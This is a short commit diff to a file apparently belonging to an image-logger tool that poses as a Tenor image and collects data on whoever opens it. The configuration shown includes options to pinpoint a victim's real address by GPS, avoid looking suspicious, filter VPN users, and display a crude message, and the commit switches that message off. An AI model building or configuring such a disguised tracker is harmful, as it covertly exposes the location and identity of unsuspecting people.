50d4605a15a70bdd97ce8949cde4815eba0fa18f
SIGMABOOS <johnpork61920@outlook.com>
2025-05-01 00:37:41 -0400

    Update tenor.py

--- api/tenor.py
+++ api/tenor.py
@@ -27,9 +27,9 @@ config = {
     "accurateLocation": false, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": true, # Enable the custom message?
+        "doMessage": false, # Enable the custom message?
         "message": "I MY DICK PIC", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+        "richMessage": false, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
